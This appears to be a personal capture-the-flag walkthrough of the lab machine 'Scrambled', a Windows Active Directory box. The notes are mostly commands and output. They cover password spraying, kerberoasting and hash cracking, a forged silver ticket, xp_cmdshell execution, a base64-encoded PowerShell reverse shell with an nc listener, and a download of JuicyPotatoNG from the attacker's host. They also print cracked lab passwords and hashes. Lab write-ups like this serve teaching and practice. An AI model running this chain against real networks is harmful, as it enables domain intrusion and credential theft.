
---

About Scrambled

Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user `ksimpson`. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the `Public` share with the credentials of `ksimpson`, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account `SqlSvc` has a `Service Principal Name` (SPN) associated with it. An attacker can use this information to perform an attack that is knows as `kerberoasting` and get the hash of `SqlSvc`. After cracking the hash and acquiring the credentials for the `SqlSvc` account an attacker can perform a `silver ticket` attack to forge a ticket and impersonate the user `Administrator` on the remote MSSQL service. Enumeration of the database reveals the credentials for user `MiscSvc`, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a `.NET` application, which is listening on port `4411`. Reverse engineering the application reveals that it is using the insecure `Binary Formatter` class to transmit data, allowing the attacker to upload their own payload and get code execution as `nt authority\system`.

---
# IP =`10.10.11.168`
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -T4 10.10.11.168  
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-19 11:13:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-19T11:16:11+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-19T11:16:11+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-02-19T11:16:11+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-18T18:09:50
|_Not valid after:  2055-02-18T18:09:50
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-19T11:16:11+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-02-19T11:16:11+00:00; +1s from scanner time.
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-02-19T11:15:32
|_  start_date: N/A

```
-add the etc/hosts
```bash 
┌──(pwn㉿kali)-[~]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.168    scrm.local
10.10.11.168    DC1.scrm.local
```
-visit the http port 80
-ntlm is disabled
-user ksimpson leaked

-copy image link
```bash
┌──(pwn㉿kali)-[~/Scrambled]
└─$ wget http://10.10.11.168/images/ipconfig.jpg              

┌──(pwn㉿kali)-[~/Scrambled]
└─$ exiftool ipconfig.jpg 

Artist                          : VbScrub
XP Author                       : VbScrub

┌──(pwn㉿kali)-[~/Scrambled]
└─$ cat user.txt 
ksimpson
VbScrub
support
```

-http://10.10.11.168/salesorders.html
-http://10.10.11.168/passwords.html
```
Password Resets

Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username. 
```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo ./kerbrute userenum -d scrm.local --dc dc1.scrm.local /home/pwn/Scrambled/user.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/19/25 - Ronnie Flathers @ropnop

2025/02/19 06:35:06 >  Using KDC(s):
2025/02/19 06:35:06 >   dc1.scrm.local:88

2025/02/19 06:35:06 >  [+] VALID USERNAME:       ksimpson@scrm.local
2025/02/19 06:35:06 >  Done! Tested 3 usernames (1 valid) in 0.099 seconds

```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo ./kerbrute passwordspray -d scrm.local --dc dc1.scrm.local /home/pwn/Scrambled/user.txt ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/19/25 - Ronnie Flathers @ropnop

2025/02/19 06:36:26 >  Using KDC(s):
2025/02/19 06:36:26 >   dc1.scrm.local:88

2025/02/19 06:36:26 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2025/02/19 06:36:26 >  Done! Tested 3 logins (1 successes) in 0.409 seconds

```

-getting tgt
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 getTGT.py -h                                                                    
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

usage: getTGT.py [-h] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                 [-service SPN] [-principalType [PRINCIPALTYPE]]
                 identity

Given a password, hash or aesKey, it will request a TGT and save it as ccache

positional arguments:
  identity              [domain/]username[:password]

```

---

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 getTGT.py scrm.local/ksimpson:ksimpson
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ksimpson.ccache

```

```
-k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on
                        target parameters. If valid credentials cannot be found, it will use the ones specified in
                        the command line

```

Export the `KRB5CCNAME` environment variable to use the cached ticket:
```bash
export KRB5CCNAME=ksimpson.ccache
```
Check if the ticket is valid using:
```bash

┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo apt install krb5-user -y
$ klist
```

---
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ klist                            
Ticket cache: FILE:ksimpson.ccache
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
02/19/2025 06:40:14  02/19/2025 16:40:14  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 02/20/2025 06:40:13

```
-valid for 10 hours
-use k for ticket
-check services
-when ever we use `kerbrosting` tool we must use dc-host mot ip
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ ./GetUserSPNs.py scrm.local/ksimpson -dc-host dc1.scrm.local -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2025-02-18 13:29:17.816856             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2025-02-18 13:29:17.816856             

```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ ./GetUserSPNs.py scrm.local/ksimpson -dc-host dc1.scrm.local -k -no-pass -request

----
The **Domain Controller (DC)** issued the requested service tickets but **encrypted them using the NTLM hash of the service account** (`sqlsvc` in this case).

hash revealed crack it
```

```bash
┌──(pwn㉿kali)-[~/Scrambled]
└─$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force


-Pegasus60
```
-Pegasus60
-sqlsvc

---
-mssql open port try to login via cred
	no we cant

---

| Feature                  | **Silver Ticket**                               | **Golden Ticket**                                      |
| ------------------------ | ----------------------------------------------- | ------------------------------------------------------ |
| **What It Forges**       | TGS (Service Ticket)                            | TGT (Ticket Granting Ticket)                           |
| **Requires**             | NTLM hash of service account                    | NTLM hash of KRBTGT account                            |
| **Scope**                | Access to a specific service (SMB, MSSQL, etc.) | Full domain access (create TGS for any service & user) |
| **Persistence**          | Lasts until service account password changes    | Lasts until KRBTGT password is reset (rarely done)     |
| **Stealth**              | No logs on the Domain Controller                | Some DC logs may appear (but still hard to detect)     |
| **Detection Difficulty** | Harder to detect                                | Slightly easier (but still very difficult)             |

---

silver ticket requirs :

| **Requires** | NTLM hash of service account |
| ------------ | ---------------------------- |

---

-in google : to ntlm or using nthash.py
-i already have the password
```
b999a16500b87d17ec7f2e2a68778f05
```

```
ServicePrincipalName:

MSSQLSvc/dc1.scrm.local:1433            
MSSQLSvc/dc1.scrm.local                     
sqlsvc:Pegasus60:MSSQLSvc/dc1.scrm.local:b999a16500b87d17ec7f2e2a68778f05
```

---
-we need domain sid == security identifier
-domain sid is prefix to user sid

---

example:
```
`S-1-5-21-1234567890-987654321-1122334455`
`S-1-5-21-1234567890-987654321-1122334455-1001`
```
- The first part (`S-1-5-21`) specifies that this is a **domain SID**.
- The rest (`1234567890-987654321-1122334455`) is a unique identifier for your domain.

- The `S-1-5-21-1234567890-987654321-1122334455` part is the **Domain SID** (the same as the domain SID above).
- The `1001` part is the **RID**, which is unique to the user or group (in this case, it would refer to a specific user or group).



---
-impacket getpac.py <> `PAC (Privilege Attribute Certificate)`
```bash

┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson


Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

---
-create silver ticket
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 ticketer.py -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local
[sudo] password for pwn: 


[*] Saving ticket in Administrator.ccache

```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ export KRB5CCNAME=Administrator.ccache
                                                                                                                     
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@SCRM.LOCAL

Valid starting       Expires              Service principal
02/19/2025 07:41:36  02/17/2035 07:41:36  MSSQLSvc/dc1.scrm.local@SCRM.LOCAL
        renew until 02/17/2035 07:41:36

```
-10 year ticket <> easy to detect 10 years!!!!!!
-lets use the ticket
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 mssqlclient.py dc1.scrm.local -k                                   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 

```

```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
output        
-----------   
scrm\sqlsvc   

NULL          

```
-if didnt work use enable xp_cmdshell , because we are administrator
-lets get a reverse shell
```bash
┌──(pwn㉿kali)-[~/Scrambled]
└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 /home/pwn/Scrambled 

┌──(pwn㉿kali)-[~/Scrambled]
└─$ ls
hash.txt  Invoke-PowerShellTcpOneLine.ps1  ipconfig.jpg  user.txt

```

```bash
┌──(pwn㉿kali)-[~/Scrambled]
└─$ cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t UTF-16LE | base64 -w 0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AH--------------LgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=
```

```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell powershell -enc JABjAG,,,,,,,,,,
```


```bash
nc -nlvp 9999
```

```bash
PS C:\users> whoami
scrm\sqlsvc
PS C:\users> 

```

```bash
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

---
https://github.com/antonioCoco/JuicyPotatoNG/releases

```bash
PS C:\programdata> wget http://10.10.14.6:8888/JuicyPotatoNG.exe -O JuicyPotatoNG.exe
```

---
didnt work for me
lets enumerate the database

---
```bash
SQL (SCRM\administrator  dbo@master)> select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;
TABLE_NAME   
----------   
Employees    

UserImport   

Timesheets   

SQL (SCRM\administrator  dbo@master)> 

```

```bash
SQL (SCRM\administrator  dbo@master)> select * from ScrambleHR.dbo.UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               
```

```bash
──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 getTGT.py scrm.local/MiscSvc:ScrambledEggs9900 
[sudo] password for pwn: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in MiscSvc.ccache

```

```bash
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miscsvc\Documents> dir
*Evil-WinRM* PS C:\Users\miscsvc\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\miscsvc\desktop> dir


    Directory: C:\Users\miscsvc\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/18/2025   6:09 PM             34 user.txt

```

---

